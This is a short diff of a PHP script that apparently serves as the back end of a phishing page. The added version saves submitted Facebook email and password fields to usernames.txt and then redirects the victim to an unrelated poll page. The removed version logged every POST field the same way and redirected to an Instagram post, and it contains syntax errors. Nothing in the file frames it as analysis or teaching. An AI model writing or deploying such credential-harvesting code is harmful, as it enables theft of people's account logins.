@@ -1,13 +1,6 @@
-_<?php
-header ('Location:- https://www.instagram.com/p/CIDHlsxDiYd/?utm_medium=copy_link'); ');
-$handle = fopen('usernames.txt', 'a');
-foreach($_POST as $variable => $value) {
-fwrite($handle, $variable);
-fwrite($handle, '=');
-fwrite($handle, $value);
-fwrite($handle, 'rn');
-}
-fwrite($handle, 'rn');
-fclose($handle);
-exit;
-?> _
+<?php
+
+file_put_contents("usernames.txt", "Facebook Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
+header('Location: https://fast-poll.com/poll/a8e2e2b9');
+exit();
+?>
